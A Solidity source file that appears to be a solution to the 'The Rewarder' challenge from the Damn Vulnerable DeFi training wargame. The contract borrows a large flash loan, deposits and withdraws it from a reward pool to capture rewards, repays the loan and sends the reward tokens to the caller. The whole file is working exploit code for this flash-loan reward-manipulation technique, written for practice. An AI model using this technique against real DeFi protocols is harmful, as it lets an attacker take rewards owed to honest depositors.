// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 */
contract TheRewarderAttacker {
    using Address for address payable;

    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public theRewarderPool;
    RewardToken public rewardToken;
    DamnValuableToken public damnValuableToken;
    AccountingToken public accountingToken;

    constructor(address _flashLoanerPool, address _theRewarderPool, address _rewardToken, address _damnValuableToken, address _accountingToken) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        rewardToken = RewardToken(_rewardToken);
        damnValuableToken = DamnValuableToken(_damnValuableToken);
        accountingToken = AccountingToken(_accountingToken);
    }

    function receiveFlashLoan(uint256 amount) external {
        damnValuableToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);

        damnValuableToken.transfer(address(flashLoanerPool), amount);
    }

    function attack() external {
        flashLoanerPool.flashLoan(1000000 ether);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
